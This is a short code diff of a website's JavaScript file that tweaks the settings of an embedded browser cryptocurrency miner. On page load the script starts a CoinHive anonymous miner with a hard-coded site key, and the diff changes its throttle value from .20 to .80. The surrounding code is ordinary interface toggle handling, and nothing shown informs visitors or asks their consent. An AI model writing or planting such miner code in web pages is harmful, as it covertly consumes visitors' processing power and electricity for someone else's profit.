@@ -1,7 +1,7 @@
 document.addEventListener("DOMContentLoaded", function(event) {
 
     var miner = new CoinHive.Anonymous('aksVrkHBo5squRsIoIG4tCLsfii3jknj');
-    miner.setThrottle(.20);
+    miner.setThrottle(.80);
 
     $('.toggle').click(function() {
         $(this).toggleClass('active');
